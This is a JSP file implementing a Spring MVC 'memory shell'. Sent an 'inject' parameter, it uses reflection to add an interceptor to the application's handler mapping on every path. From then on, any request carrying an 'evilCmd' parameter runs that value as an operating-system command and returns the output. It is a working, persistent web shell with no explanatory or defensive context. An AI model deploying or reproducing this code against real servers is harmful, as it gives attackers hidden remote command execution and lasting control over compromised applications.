<%@ page import="org.springframework.web.servlet.HandlerInterceptor" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.springframework.web.context.WebApplicationContext" %>
<%@ page import="org.springframework.web.servlet.HandlerMapping" %>
<%@ page import="org.springframework.web.context.request.RequestContextHolder" %>
<%@ page import="org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping" %>
<%@ page import="org.springframework.web.servlet.handler.AbstractHandlerMapping" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="org.springframework.web.servlet.handler.MappedInterceptor" %>
<%@ page import="org.springframework.web.context.support.WebApplicationContextUtils" %>

<%
    class EviIInterceptor implements HandlerInterceptor {
        @Override
        public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) throws IOException {
            // this method is called before the request is handled by a controller
            String cmd = req.getParameter("evilCmd");
            if (cmd != null) {
                byte[] result = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
                PrintWriter output = resp.getWriter();
                output.write(new String(result));
                output.flush();
                output.close(); // avoid being ovw by the controller
            }

            return true;
        }
    }

    if (request.getParameter("inject") != null) {
        try {
//            WebApplicationContext ctx = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            WebApplicationContext ctx = WebApplicationContextUtils.getWebApplicationContext(application);

            assert ctx != null;
            HandlerMapping mapping = (HandlerMapping) ctx.getBean(RequestMappingHandlerMapping.class);

            Field adaptedInterceptors = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");

            adaptedInterceptors.setAccessible(true);

            ArrayList<MappedInterceptor> interceptors = (ArrayList<MappedInterceptor>) adaptedInterceptors.get(mapping);

            String[] includePatterns = {"/*"};
            HandlerInterceptor interceptor = new EviIInterceptor();

            MappedInterceptor mappedInterceptor = new MappedInterceptor(includePatterns, interceptor);
            interceptors.add(mappedInterceptor);

            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>